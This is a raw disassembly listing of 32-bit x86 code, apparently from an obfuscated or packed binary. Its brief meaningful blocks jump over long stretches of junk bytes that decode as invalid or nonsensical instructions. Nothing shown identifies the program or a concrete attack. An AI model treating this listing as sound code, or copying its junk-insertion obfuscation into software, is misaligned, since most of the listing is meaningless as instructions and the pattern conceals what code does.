  41f3e2:	cmp    DWORD PTR ds:0x433580,0x0
  41f3e9:	jbe    0x41f4e1
  41f3ef:	movzx  ecx,BYTE PTR ds:0x4335fc
  41f3f6:	and    DWORD PTR ds:0x433628,ecx
  41f3fc:	jmp    0x41f4e1
  41f401:	push   DWORD PTR [ebp-0x14]
  41f404:	push   DWORD PTR [ebp-0x28]
  41f407:	push   DWORD PTR [ebp-0x18]
  41f40a:	push   DWORD PTR [ebp-0x10]
  41f40d:	call   DWORD PTR ds:0x43c7fc
  41f413:	jmp    0x41f4e1
  41f418:	das    
  41f419:	jnp    0x41f3e1
  41f41b:	inc    ecx
  41f41c:	(bad)  
  41f41d:	std    
  41f41e:	scas   eax,DWORD PTR es:[edi]
  41f41f:	jg     0x41f453
  41f421:	xor    DWORD PTR [eax-0x22],ecx
  41f424:	jecxz  0x41f4a5
  41f426:	sub    al,0xbc
  41f428:	(bad)  
  41f429:	ins    BYTE PTR es:[edi],dx
  41f42a:	add    DWORD PTR [eax],eax
  41f42c:	mov    cl,0x0
  41f42e:	add    BYTE PTR [eax],al
  41f430:	cs aad 0x96
  41f433:	mov    WORD PTR [edi-0x2a],gs
  41f436:	xor    BYTE PTR [edx+ebp*8+0x23043137],dh
  41f43d:	push   edx
  41f43e:	sub    cl,BYTE PTR [ebp-0x80]
  41f441:	imul   edi,DWORD PTR [ecx-0x46b374e1],0xbf88053c
  41f44b:	dec    edi
  41f44c:	or     al,0xac
  41f44e:	(bad)  
  41f44f:	sti    
  41f450:	enter  0xac4d,0x59
  41f454:	and    eax,0xcecebbea
  41f459:	into   
  41f45a:	lahf   
  41f45b:	adc    esp,eax
  41f45d:	cmp    eax,0xa6a3f960
  41f462:	cmp    BYTE PTR [esi-0x40],bl
  41f465:	enter  0x28,0xcb
  41f469:	dec    ebp
  41f46a:	sbb    al,0x2
  41f46c:	mov    BYTE PTR [edx],dl
  41f46e:	xor    eax,0x6b602592
  41f473:	popa   
  41f474:	adc    dh,BYTE PTR [si]
  41f477:	rcl    DWORD PTR [ebx+esi*8-0x32],cl
  41f47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f47c:	jns    0x41f4ab
  41f47e:	inc    ecx
  41f47f:	mov    esp,0x78282b62
  41f484:	iret   
  41f485:	bound  esi,QWORD PTR [edx-0x69]
  41f488:	repnz sub ah,BYTE PTR [ebx+ebp*2+0x13b3c27]
  41f490:	and    BYTE PTR [ecx-0x3d],0x9a
  41f494:	cmc    
  41f495:	mov    ebp,0xfe096746
  41f49a:	out    0xf7,eax
  41f49c:	call   0xc36d:0xfeab82cd
  41f4a3:	(bad)  
  41f4a4:	adc    esp,DWORD PTR [esi]
  41f4a6:	mov    eax,0x7f80a228
  41f4ab:	mov    al,0x0
  41f4ad:	loopne 0x41f4a4
  41f4af:	jo     0x41f509
  41f4b1:	pop    esp
  41f4b2:	xor    al,0x8e
  41f4b4:	push   ebx
  41f4b5:	clc    
  41f4b6:	(bad)  
  41f4b7:	test   al,0x68
  41f4b9:	xchg   ecx,eax
  41f4ba:	ret    0xeed1
  41f4bd:	mov    ebx,0x4eb873a3
  41f4c2:	jbe    0x41f541
  41f4c4:	in     eax,dx
  41f4c5:	pop    ecx
  41f4c6:	outs   dx,DWORD PTR ds:[esi]
  41f4c7:	add    BYTE PTR [edi+0x13db76fb],ch
  41f4cd:	jg     0x41f4fd
  41f4cf:	stos   BYTE PTR es:[edi],al
  41f4d0:	jno    0x41f4f4
  41f4d2:	dec    esp
  41f4d3:	xlat   BYTE PTR ds:[ebx]
  41f4d4:	repz mov WORD PTR [esi],cs
  41f4d7:	outs   dx,DWORD PTR ds:[esi]
  41f4d8:	retf   
  41f4d9:	sub    al,0xee
  41f4db:	out    dx,eax
  41f4dc:	shl    BYTE PTR [edi],0xa
  41f4df:	jne    0x41f4be
  41f4e1:	sub    eax,ebx
  41f4e3:	jmp    0x41f5b1
  41f4e8:	adc    ecx,eax
  41f4ea:	mov    edx,0xf37bfb4b
  41f4ef:	fsub   DWORD PTR ds:0x9470d2ab
  41f4f5:	lahf   
  41f4f6:	jne    0x41f546
  41f4f8:	js     0x41f567
  41f4fa:	add    DWORD PTR [eax],eax
  41f4fc:	mov    cl,0x0
  41f4fe:	add    BYTE PTR [eax],al
  41f500:	add    eax,0x899b3dfe
  41f505:	sbb    BYTE PTR [edx-0x23976e36],ch
  41f50b:	mov    edi,DWORD PTR [esi+0x1c9d1b03]
  41f511:	adc    cl,dl
  41f513:	clc    
  41f514:	iret   
  41f515:	cmp    al,0x72
  41f517:	mov    ebp,DWORD PTR [ebx+edx*1+0x1e459891]
  41f51e:	mov    BYTE PTR [edx-0x77],ch
  41f521:	ret    0x164e
  41f524:	arpl   WORD PTR [ecx],si
  41f526:	(bad)  
  41f527:	(bad)  
  41f529:	ds push edx
  41f52b:	cmp    ebx,edi
  41f52d:	and    DWORD PTR [ebx],eax
  41f52f:	pop    edx
  41f530:	cli    
  41f531:	call   0xa0d983af
  41f536:	push   0x9c3c7a54
  41f53b:	adc    al,0x39
  41f53d:	cs retf 
  41f53f:	adc    eax,0xf01af5d2
  41f544:	mulps  xmm3,XMMWORD PTR ds:0xd79d30c2
  41f54b:	cmc    
  41f54c:	div    ecx
  41f54e:	dec    esi
  41f54f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f550:	not    DWORD PTR [ecx+0x3070c3a3]
  41f556:	retf   
  41f557:	lahf   
  41f558:	jnp    0x41f55a
  41f55a:	pop    ds
  41f55b:	pop    cx
  41f55d:	jge    0x41f53a
  41f55f:	add    al,0xb4
  41f561:	neg    BYTE PTR [eax-0x5c]
  41f564:	imul   ebp,DWORD PTR [ecx+0x63],0x41
  41f568:	pop    edi
  41f569:	mov    dl,BYTE PTR [esi]
  41f56b:	pusha  
  41f56c:	mov    edi,0x92a4fab
  41f571:	jge    0x41f527
  41f573:	icebp  
  41f574:	nop
  41f575:	mov    edx,0xd04bfdbb
  41f57a:	fwait
  41f57b:	push   fs
  41f57d:	dec    edi
  41f57e:	xor    DWORD PTR [edx],ecx
  41f580:	push   0xfffffff0
  41f582:	out    dx,al
  41f583:	mov    eax,0x420646ae
  41f588:	fldenv [esp+ebp*8+0x11]
  41f58c:	nop
  41f58d:	dec    esp
  41f58e:	jmp    0xbafc:0xc53921a0
  41f595:	addr16 or al,0xda
  41f598:	cmc    
  41f599:	imul   ebp,DWORD PTR [eax+eax*8+0x67],0xfffffffc
  41f59e:	or     al,0xb
  41f5a0:	(bad)  
  41f5a1:	stc    
  41f5a2:	ret    
  41f5a3:	jle    0x41f532
  41f5a5:	or     BYTE PTR [edx-0x34],bh
  41f5a8:	push   ds
  41f5a9:	lds    ebx,FWORD PTR ds:[edx-0x556077bf]
  41f5b0:	fisttp QWORD PTR [ecx-0x4b5e33bb]
  41f5b6:	xor    DWORD PTR [ebx+0x0],eax
  41f5b9:	mov    DWORD PTR [ebp-0x34],eax
  41f5bc:	jmp    0x41f68a
  41f5c1:	icebp  
  41f5c2:	rcr    BYTE PTR [ecx-0x31],0x79
  41f5c6:	fcomip st,st(7)
  41f5c8:	(bad)  
  41f5c9:	fisttp WORD PTR [ebx+0xa5e9fdd]
  41f5cf:	jmp    0x41f576
  41f5d1:	sub    DWORD PTR [esi+0x1],ebp
  41f5d4:	add    BYTE PTR [ecx-0x5e000000],dh
  41f5da:	mov    esi,0xc3760442
  41f5df:	push   ecx
  41f5e0:	(bad)  
  41f5e1:	jno    0x41f582
  41f5e3:	sub    al,0xad
  41f5e5:	and    BYTE PTR [edx],dh
  41f5e7:	pop    eax
  41f5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e9:	je     0x41f60d
  41f5eb:	mov    dl,BYTE PTR [ebp+0x769c9e85]
  41f5f1:	into   
  41f5f2:	aas    
  41f5f3:	(bad)  
  41f5f4:	out    0x90,al
  41f5f6:	inc    edx
  41f5f7:	jge    0x41f66c
  41f5f9:	repz mov WORD PTR [edi+0x6eb246ec],cs
  41f600:	inc    eax
  41f601:	std    
  41f602:	mov    edx,ebx
  41f604:	adc    dh,BYTE PTR [ebx+0x71]
  41f607:	(bad)  
  41f608:	repnz ffreep st(3)
  41f60b:	js     0x41f618
  41f60d:	pop    ebx
  41f60e:	(bad)  
  41f60f:	and    al,0x3e
  41f611:	or     ebx,esi
  41f613:	dec    eax
  41f614:	fisttp QWORD PTR [edi]
  41f616:	in     eax,0x67
  41f618:	pop    edx
  41f619:	repnz sbb DWORD PTR [ecx+0x56],esp
  41f61d:	or     DWORD PTR [ecx-0x45dd3eae],ebx
  41f623:	inc    edi
  41f624:	ror    BYTE PTR [ebx+0x71],1
  41f627:	(bad)  
  41f628:	call   0xfabc2f59
  41f62d:	les    ebp,FWORD PTR [ebp+0x6c]
  41f630:	inc    edi
  41f631:	popf   
  41f632:	xchg   ecx,eax
  41f633:	test   al,0x24
  41f635:	gs std 
  41f637:	add    DWORD PTR [eax+0x5e4020a0],edi
  41f63d:	pop    es
  41f63e:	mov    es,WORD PTR [edi+0x6c20da3a]
  41f644:	mov    dh,0x28
  41f646:	adc    esi,DWORD PTR [eax]
  41f648:	sbb    BYTE PTR ds:0x4d880639,al
  41f64e:	dec    ebx
  41f64f:	mov    al,ds:0x4e9fea15
  41f654:	les    ebp,FWORD PTR [edi-0x246becfa]
  41f65a:	mov    ebp,0xa24eb9e9
  41f65f:	dec    edx
  41f660:	stos   DWORD PTR es:[edi],eax
  41f661:	add    DWORD PTR [ecx],ebx
  41f663:	xchg   ebp,eax
  41f664:	lods   al,BYTE PTR ds:[esi]
  41f665:	jle    0x41f638
  41f667:	fidiv  WORD PTR [edi+0xf]
  41f66a:	std    
  41f66b:	imul   ecx,DWORD PTR [edi-0x21],0x7ff53b87
  41f672:	or     BYTE PTR [edx+0x73],dl
  41f675:	int3   
  41f676:	and    ch,BYTE PTR [edi+0x4dc69ae]
  41f67c:	cmp    al,0x75
  41f67e:	sub    al,0xb8
  41f680:	jecxz  0x41f695
  41f682:	dec    ebx
  41f683:	jle    0x41f677
  41f685:	scas   eax,DWORD PTR es:[edi]
  41f686:	and    DWORD PTR [ecx],eax
  41f688:	retf   
  41f689:	mov    esi,0x89c0458b
  41f68e:	inc    ebp
  41f68f:	in     al,0x8b
  41f691:	inc    ebp
  41f692:	in     al,0xe9
  41f694:	leave  
  41f695:	add    BYTE PTR [eax],al
  41f697:	add    ah,al
  41f699:	dec    ebx
  41f69a:	pop    es
  41f69b:	cwde   
  41f69c:	(bad)  
  41f69d:	(bad)  
  41f69f:	pop    edi
  41f6a0:	gs adc edx,edi
  41f6a3:	lahf   
  41f6a4:	ja     0x41f663
  41f6a6:	add    al,0x5f
  41f6a8:	fisubr DWORD PTR [esi+0x1]
  41f6ab:	add    BYTE PTR [ecx+0x3a000000],dh
  41f6b1:	call   0x2b58a7e6
  41f6b6:	push   ds
  41f6b7:	sbb    DWORD PTR [edi-0x25],esi
  41f6ba:	pop    ds
  41f6bb:	cwde   
  41f6bc:	out    dx,al
  41f6bd:	mov    esp,0x669afc49
  41f6c2:	xchg   bh,al
  41f6c4:	adc    al,0x5e
  41f6c6:	dec    esp
  41f6c7:	in     eax,0xaa
  41f6c9:	test   al,0x5
  41f6cb:	sbb    cl,BYTE PTR [ebp-0x69]
  41f6ce:	neg    BYTE PTR [ecx+0xf]
  41f6d1:	rol    BYTE PTR [edi+0x67b2fa54],cl
  41f6d7:	or     BYTE PTR [eax],dl
  41f6d9:	test   BYTE PTR [esi-0x45d2c0d2],0x40
  41f6e0:	push   edi
  41f6e1:	push   ebx
  41f6e2:	icebp  
  41f6e3:	sbb    al,0xf8
  41f6e5:	pop    eax
  41f6e6:	popa   
  41f6e7:	cmp    DWORD PTR [edi],ecx
  41f6e9:	xchg   BYTE PTR [edx],dl
  41f6eb:	ins    DWORD PTR es:[edi],dx
  41f6ec:	pusha  
  41f6ed:	inc    ebp
  41f6ee:	mov    eax,ds:0x9b361d97
  41f6f3:	leave  
  41f6f4:	inc    ecx
  41f6f5:	in     eax,0xf5
  41f6f7:	cdq    
  41f6f8:	jecxz  0x41f6a8
  41f6fa:	gs jecxz 0x41f6eb
  41f6fd:	or     esi,ebx
  41f6ff:	dec    eax
  41f700:	idiv   BYTE PTR [esi-0x1b]
  41f703:	xchg   edx,eax
  41f704:	sub    al,BYTE PTR [eax]
  41f706:	add    esp,eax
  41f708:	mov    cl,0x1
  41f70a:	mov    al,0x91
  41f70c:	push   edx
  41f70d:	sbb    BYTE PTR [edx+0x374a0706],al
  41f713:	sbb    DWORD PTR [edi],esp
  41f715:	lahf   
  41f716:	mov    cl,0x6c
  41f718:	sbb    edx,eax
  41f71a:	jns    0x41f74e
  41f71c:	(bad)  
  41f71d:	or     al,0xac
  41f71f:	jge    0x41f721
  41f721:	pop    ebx
  41f722:	mov    esp,0xfe87ebce
  41f727:	mov    ecx,0xa17e8af
  41f72c:	push   ds
  41f72d:	mov    esp,DWORD PTR [ebx]
  41f72f:	xor    BYTE PTR [edi],dl
  41f731:	les    edx,FWORD PTR ds:0x39de1401
  41f737:	cmp    ecx,DWORD PTR [esi-0x439ecac0]
  41f73d:	inc    edx
  41f73e:	(bad)  
  41f73f:	cmc    
  41f740:	push   ss
  41f741:	xchg   edi,eax
  41f742:	mov    cl,0xf3
  41f744:	ds sub eax,0x96f821a6
  41f74b:	inc    esi
  41f74c:	pop    ecx
  41f74d:	(bad)  
  41f74e:	int3   
  41f74f:	dec    esp
  41f750:	imul   edx,DWORD PTR [eax],0x49
  41f753:	lahf   
  41f754:	xchg   esi,eax
  41f755:	retf   0xe311
  41f758:	das    
  41f759:	mov    eax,0x717c7ef2
  41f75e:	dec    ebp
  41f75f:	jg     0x41f75c
  41f761:	push   0x4
  41f763:	pop    ecx
  41f764:	movzx  edx,WORD PTR ds:0x43358c
  41f76b:	sub    DWORD PTR ds:0x43360c,edx
  41f771:	sub    ecx,eax
  41f773:	add    ecx,DWORD PTR [ebp-0x3c]
  41f776:	cmp    DWORD PTR ds:0x43361c,0x0
  41f77d:	ja     0x41f7ab
  41f783:	movzx  edx,WORD PTR ds:0x4335ec
  41f78a:	or     DWORD PTR ds:0x433630,edx
  41f790:	adc    eax,DWORD PTR ds:0x433550
  41f796:	jmp    0x41f7ab
  41f79b:	push   0x30ec
  41f7a0:	push   0x1f23
  41f7a5:	call   DWORD PTR ds:0x43c7c0
  41f7ab:	mov    DWORD PTR [ebp-0x10],ecx
  41f7ae:	mov    DWORD PTR [ebp-0x90],0x4aefda42
  41f7b8:	jmp    0x41f886
  41f7bd:	add    DWORD PTR [esi+0x13],eax
  41f7c0:	dec    ebp
  41f7c1:	push   edi
  41f7c2:	pop    ebp
  41f7c3:	pop    edi
  41f7c4:	dec    esi
  41f7c5:	mov    eax,ds:0xbdde7906
  41f7ca:	popf   
  41f7cb:	push   ecx
  41f7cc:	sbb    al,0x8b
  41f7ce:	outs   dx,DWORD PTR ds:[esi]
  41f7cf:	add    DWORD PTR [eax],eax
  41f7d1:	mov    cl,0x0
  41f7d3:	add    BYTE PTR [eax],al
  41f7d5:	iret   
  41f7d6:	push   eax
  41f7d7:	pop    eax
  41f7d8:	lods   eax,DWORD PTR ds:[esi]
  41f7d9:	cld    
  41f7da:	sub    dl,dl
  41f7dc:	mov    gs,ebx
  41f7de:	(bad)  
  41f7df:	cmc    
  41f7e0:	outs   dx,BYTE PTR ds:[esi]
  41f7e1:	(bad)
  41f7e5:	ds pop esp
  41f7e7:	call   0x1c07:0x2ca5664d
  41f7ee:	mov    bl,0x3a
  41f7f0:	shl    DWORD PTR [ecx-0x3f],cl
  41f7f3:	jno    0x41f7d3
  41f7f5:	xchg   esp,ecx
  41f7f7:	dec    ebx
  41f7f8:	dec    edx
  41f7f9:	sub    DWORD PTR [ecx+edx*8-0x77],ebx
  41f7fd:	mov    ecx,ebx
  41f7ff:	lea    eax,[edi+esi*1]
  41f802:	aam    0x22
  41f804:	dec    ebp
  41f805:	jle    0x41f7ba
  41f807:	or     esi,eax
  41f809:	lods   al,BYTE PTR ds:[esi]
  41f80a:	lea    edx,[eax+esi*4-0x7b55888e]
  41f811:	pop    ss
  41f812:	xor    ecx,DWORD PTR [edi]
  41f814:	cwde   
  41f815:	push   0xc83430b8
  41f81a:	call   0xa900:0xf768242f
  41f821:	add    al,0xe4
  41f823:	sbb    BYTE PTR [eax],ch
  41f825:	inc    esp
  41f826:	cdq    
  41f827:	test   al,0x40
  41f829:	cdq    
  41f82a:	(bad)  
  41f82b:	iret   
  41f82c:	test   BYTE PTR [edx+0xf],bl
  41f82f:	bound  edi,QWORD PTR [esp+ecx*4-0x7d69beaa]
  41f836:	stos   DWORD PTR es:[edi],eax
  41f837:	dec    ecx
  41f838:	ficomp DWORD PTR [ecx]
  41f83a:	xchg   esi,eax
  41f83b:	dec    ebp
  41f83c:	adc    DWORD PTR [eax-0x39],ebp
  41f83f:	jg     0x41f7ee
  41f841:	or     eax,0x121e8416
  41f846:	pop    ds
  41f847:	push   cs
  41f848:	adc    cl,ch
  41f84a:	in     eax,0xe1
  41f84c:	xchg   BYTE PTR [ecx-0x15c1e86b],ch
  41f852:	dec    edx
  41f853:	pop    esp
  41f854:	or     al,0xf3
  41f856:	jne    0x41f84f
  41f858:	push   ebp
  41f859:	(bad)  
  41f85a:	fild   DWORD PTR [esp+eax*2-0x439b4b13]
  41f861:	dec    esp
  41f862:	adc    cl,dh
  41f864:	jmp    0xd6ad:0x49574d9c
  41f86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f86c:	push   edx
  41f86d:	shl    BYTE PTR [esi-0x2a],0xda
  41f871:	mov    ecx,0xd8ec5ca9
  41f876:	int3   
  41f877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f878:	add    BYTE PTR [esi],al
  41f87a:	imul   ebx,DWORD PTR [esi+0x6fd86574],0xffffffc3
  41f881:	mov    ebx,0x4c1cbfed
  41f886:	mov    eax,DWORD PTR [ebp-0x1c]
  41f889:	mov    ecx,DWORD PTR [ebp+0x8]
  41f88c:	and    DWORD PTR ds:0x433570,edi
  41f892:	mov    edx,DWORD PTR [ebp+0xc]
  41f895:	jmp    0x41f963
  41f89a:	mov    WORD PTR ds:0xfeffbc5f,fs
  41f8a0:	out    dx,eax
  41f8a1:	xor    eax,0xdfa3a31
  41f8a6:	fisubr DWORD PTR [edi-0x61]
  41f8a9:	mov    ?,WORD PTR [eax+esi*2]
  41f8ac:	add    DWORD PTR [eax],eax
  41f8ae:	mov    cl,0x0
  41f8b0:	add    BYTE PTR [eax],al
  41f8b2:	push   ebx
  41f8b3:	jne    0x41f86d
  41f8b5:	xor    edi,DWORD PTR [esi]
  41f8b7:	mov    eax,ds:0x330b6b63
  41f8bc:	or     DWORD PTR [edx+0x11e3c87],0xdcbf6475
  41f8c6:	sbb    edi,0x71
  41f8c9:	add    BYTE PTR [esp+edi*2+0x4c],cl
  41f8cd:	cdq    
  41f8ce:	mov    cl,0xc9
  41f8d0:	(bad)  
  41f8d1:	push   esi
  41f8d2:	xor    dh,BYTE PTR [esi+0x6]
  41f8d5:	ins    BYTE PTR es:[edi],dx
  41f8d6:	dec    ecx
  41f8d7:	jae    0x41f8f8
  41f8d9:	outs   dx,BYTE PTR ds:[esi]
  41f8da:	and    al,0xbe
  41f8dc:	sub    al,0x69
  41f8de:	pop    ebx
  41f8df:	setb   ch
  41f8e2:	popa   
  41f8e3:	es dec ecx
  41f8e5:	loope  0x41f8f6
  41f8e7:	je     0x41f88d
  41f8e9:	xor    esp,DWORD PTR [edi+eax*4+0x1a03412d]
  41f8f0:	mov    edi,edx
  41f8f2:	sbb    BYTE PTR gs:[edx+0x7edeec6f],0x26
  41f8fa:	in     eax,dx
  41f8fb:	inc    ebx
  41f8fc:	and    BYTE PTR [edi],bh
  41f8fe:	pop    ebp
  41f8ff:	mov    BYTE PTR [edx-0x9ff72f0],ah
  41f905:	sbb    ebx,ecx
  41f907:	popf   
  41f908:	and    al,0xdc
  41f90a:	mov    edx,0x9b24cb4e
  41f90f:	push   edx
  41f910:	out    dx,eax
  41f911:	das    
  41f912:	clc    
  41f913:	adc    al,0x7b
  41f915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f916:	cmc    
  41f917:	out    0x46,al
  41f919:	mov    bl,0xe1
  41f91b:	jno    0x41f93b
  41f91d:	mov    DWORD PTR [eax],esi
  41f91f:	loop   0x41f950
  41f921:	popa   
  41f922:	dec    ebp
  41f923:	mov    dl,0xfb
  41f925:	mov    dl,BYTE PTR [ebx+edi*2-0x62ac9fc]
  41f92c:	nop
  41f92d:	ins    BYTE PTR es:[edi],dx
  41f92e:	(bad)  
  41f92f:	call   0xc83e777f
  41f934:	cmp    BYTE PTR [ebp-0x3],dl
  41f937:	(bad)  
  41f939:	dec    edi
  41f93a:	add    BYTE PTR [esi+0x52ac07f7],al
  41f940:	xchg   ebx,eax
  41f941:	inc    edx
  41f942:	add    edi,ebx
  41f944:	inc    ebp
  41f945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f946:	(bad)  
  41f947:	shl    BYTE PTR [eax-0x26],cl
  41f94a:	xchg   edx,eax
  41f94b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f94d:	jecxz  0x41f952
  41f94f:	cmp    DWORD PTR [eax-0x28],0x6416faa0
  41f956:	mov    al,0x42
  41f958:	cdq    
  41f959:	cmp    al,0xe1
  41f95b:	imul   esi,DWORD PTR [ecx-0xd],0xe1a1e108
  41f962:	mov    eax,0x1d31ce33
  41f967:	pop    esp
  41f968:	ss inc ebx
  41f96a:	add    cl,ch
  41f96c:	leave  
  41f96d:	add    BYTE PTR [eax],al
  41f96f:	add    bh,bl
  41f971:	retf   0xe02d
  41f974:	cmp    eax,0x7bffdfe7
  41f979:	js     0x41f917
  41f97b:	cmp    dh,ah
  41f97d:	adc    bh,BYTE PTR [edi+0x170ed0d]
  41f983:	add    BYTE PTR [ecx-0x24000000],dh
  41f989:	mov    edx,0x302157f5
  41f98e:	mov    esi,gs
  41f990:	hlt    
  41f991:	cmp    BYTE PTR [edx-0x51],cl
  41f994:	fwait
  41f995:	aas    
  41f996:	loope  0x41f939
  41f998:	test   BYTE PTR [ebp+0x6c07c8e5],bl
  41f99e:	stc    
  41f99f:	push   es
  41f9a0:	mov    edx,0x5946205d
  41f9a5:	cwde   
  41f9a6:	or     BYTE PTR [eax+0x494d9f3d],0xfc
  41f9ad:	into   
  41f9ae:	rcl    BYTE PTR [esi+0x4e],1
  41f9b1:	fcmovne st,st(2)
  41f9b3:	cs pop esp
  41f9b5:	(bad)  
  41f9b6:	and    BYTE PTR es:[edi-0xcff83e9],bl
  41f9bd:	push   ss
  41f9be:	xchg   BYTE PTR [ecx-0x60fa005a],ah
  41f9c4:	jl     0x41fa29
  41f9c6:	mov    ds:0xa023b1e5,al
  41f9cb:	xchg   DWORD PTR [edx+0x399789cf],ebp
  41f9d1:	pop    ecx
  41f9d2:	xor    eax,0x42e6c4c6
  41f9d7:	push   0x19
  41f9d9:	mov    cl,0x69
  41f9db:	mov    edi,ss
  41f9dd:	pop    ss
  41f9de:	mov    dh,0xe6
  41f9e0:	ja     0x41fa52
  41f9e2:	clc    
  41f9e3:	jno    0x41f9da
  41f9e5:	xor    BYTE PTR [edx+0x67],bl
  41f9e8:	outs   dx,BYTE PTR ds:[esi]
  41f9e9:	and    al,0x64
  41f9eb:	test   al,0xc3
  41f9ed:	pushf  
  41f9ee:	fld    QWORD PTR [ebx]
  41f9f0:	or     ch,BYTE PTR [ebx+0x9]
  41f9f3:	dec    edx
  41f9f4:	adc    ch,ah
  41f9f6:	push   ebx
  41f9f7:	mov    al,ds:0x89e67568
  41f9fc:	mov    ch,0xc5
  41f9fe:	int    0xf
  41fa00:	and    edi,DWORD PTR [edi+edx*8+0x191c6cfd]
  41fa07:	cld    
  41fa08:	jo     0x41fa51
  41fa0a:	imul   esp,DWORD PTR [esi+0x21],0x61b1cd66
  41fa11:	in     al,0xa2
  41fa13:	in     eax,0x7e
  41fa15:	and    cl,dh
  41fa17:	mov    ds:0xe0f218fe,eax
  41fa1c:	das    
  41fa1d:	push   0xcdd13176
  41fa22:	jl     0x41fa49
  41fa24:	popa   
  41fa25:	fnstcw WORD PTR [edi-0xd]
  41fa28:	outs   dx,DWORD PTR ds:[esi]
  41fa29:	pop    ecx
  41fa2a:	imul   ebx,esp,0x49
  41fa2d:	mov    ebx,0x7d3e7f44
  41fa32:	xchg   esi,eax
  41fa33:	and    DWORD PTR [ebx-0x3e987389],edx
  41fa39:	mov    DWORD PTR [ebp+ecx*4+0x66e188a8],eax
  41fa40:	jmp    0x41fb0e
  41fa45:	dec    ebx
  41fa46:	stos   DWORD PTR es:[edi],eax
  41fa47:	nop
  41fa48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa49:	lock mov edi,0xd74eef7f
  41fa4f:	mov    ecx,0x8094569f
  41fa54:	or     eax,0x1719e
  41fa59:	mov    cl,0x0
  41fa5b:	add    BYTE PTR [eax],al
  41fa5d:	mov    esp,0x5a71ce34
  41fa62:	aad    0x53
  41fa64:	pop    esp
  41fa65:	lods   al,BYTE PTR ds:[esi]
  41fa66:	jae    0x41fa0a
  41fa68:	arpl   WORD PTR [ecx+0x34f808c0],cx
  41fa6e:	or     esi,DWORD PTR [edx+0x16]
  41fa71:	js     0x41fa0f
  41fa73:	fld    DWORD PTR [esi+0x38]
  41fa76:	push   cs
  41fa77:	jmp    0x41fa43
  41fa79:	jno    0x41fa17
  41fa7b:	xor    dl,al
  41fa7d:	mov    al,ds:0x37d428d1
  41fa82:	inc    ecx
  41fa83:	int3   
  41fa84:	cmp    BYTE PTR [eax+0x87a056a],al
  41fa8a:	and    DWORD PTR [ebx],edi
  41fa8c:	loope  0x41fa21
  41fa8e:	mov    edx,0xdc6f6df0
  41fa93:	mov    eax,0x783e97e1
  41fa98:	xchg   DWORD PTR [ebp+0x3a943940],esp
  41fa9e:	xor    al,0x8
  41faa0:	xor    bh,BYTE PTR [ebx-0x53761083]
  41faa6:	mov    ebx,0x807bdad7
  41faab:	cmp    cl,BYTE PTR [esi]
  41faad:	bound  edi,QWORD PTR [esi-0x58127980]
  41fab3:	bound  esi,QWORD PTR [esi+ebx*8]
  41fab6:	add    cl,cl
  41fab8:	retf   0xe594
  41fabb:	or     BYTE PTR [ebx-0x48],0x14
  41fabf:	mov    edx,0x8b7f49d
  41fac4:	sbb    ch,BYTE PTR [eax+0x3c]
  41fac7:	repnz sub BYTE PTR [ecx-0x1855b189],bl
  41face:	mov    dl,0x99
  41fad0:	mov    ebx,es
  41fad2:	xchg   edi,eax
  41fad3:	fmulp  st(1),st
  41fad5:	rol    eax,0x9
  41fad8:	xchg   esi,eax
  41fad9:	div    DWORD PTR [ebp-0x57]
  41fadc:	or     DWORD PTR [edx],0x7066bd29
  41fae2:	stc    
  41fae3:	sar    BYTE PTR [eax+0x60a5ae35],cl
  41fae9:	push   cs
  41faea:	in     al,0xd2
  41faec:	fisttp QWORD PTR [ecx]
  41faee:	mov    WORD PTR [edi-0x1ea9231a],ss
  41faf4:	fwait
  41faf5:	dec    eax
  41faf6:	sub    DWORD PTR [esi+eax*2],ecx
  41faf9:	std    
  41fafa:	cld    
  41fafb:	sub    BYTE PTR [ecx],dl
  41fafd:	jmp    0x41fb45
  41faff:	sti    
  41fb00:	scas   al,BYTE PTR es:[edi]
  41fb01:	sbb    ch,BYTE PTR [ebx-0x28]
  41fb04:	mov    al,0x2e
  41fb06:	xchg   edx,eax
  41fb07:	or     BYTE PTR [edx-0x56c7107e],bl
  41fb0d:	push   ecx
  41fb0e:	mov    eax,DWORD PTR [ebp-0x10]
  41fb11:	mov    ecx,DWORD PTR [ebp+0x10]
  41fb14:	add    DWORD PTR ds:0x433610,ecx
  41fb1a:	mov    edx,DWORD PTR [ebp+0x14]
  41fb1d:	xor    ecx,esi
  41fb1f:	and    DWORD PTR ds:0x433624,0x561f
  41fb29:	mov    DWORD PTR [ebp+ecx*4+0x66e188a8],eax
  41fb30:	xor    eax,ecx
  41fb32:	jmp    0x41fc00
  41fb37:	pop    ss
  41fb38:	sbb    eax,0xfb6f896f
  41fb3d:	neg    DWORD PTR [edi-0x1bd8939d]
  41fb43:	jae    0x41fb77
  41fb45:	mov    esp,0x1724f5f
  41fb4a:	add    BYTE PTR [ecx+0x70000000],dh
  41fb50:	popa   
  41fb51:	sbb    ah,dl
  41fb53:	xchg   ebx,eax
  41fb54:	cmp    al,0x40
  41fb56:	dec    edi
  41fb57:	fst    QWORD PTR [esi+0x71484306]
  41fb5d:	adc    ebp,esi
  41fb5f:	into   
  41fb60:	or     eax,0x94b805ab
  41fb65:	cli    
  41fb66:	pop    esp
  41fb67:	mov    ebx,esi
  41fb69:	jb     0x41fb4b
  41fb6b:	and    ebp,0x1c
  41fb6e:	popa   
  41fb6f:	sbb    DWORD PTR [edi-0x1f198041],ebp
  41fb75:	cwde   
  41fb76:	jnp    0x41fbd0
  41fb78:	mov    dh,0x4d
  41fb7a:	jle    0x41fbe9
  41fb7c:	outs   dx,DWORD PTR ds:[esi]
  41fb7d:	xchg   edx,eax
  41fb7e:	(bad)  
  41fb7f:	(bad)  
  41fb80:	pop    ss
  41fb81:	pop    edi
  41fb82:	jmp    0x41fba7
  41fb84:	test   al,dh
  41fb86:	and    ecx,edi
  41fb88:	cwde   
  41fb89:	xor    bh,ah
  41fb8b:	jns    0x41fb84
  41fb8d:	pushf  
  41fb8e:	mov    ds:0x2edfab55,al
  41fb93:	inc    ecx
  41fb94:	inc    eax
  41fb95:	pushf  
  41fb96:	mov    dh,0xb5
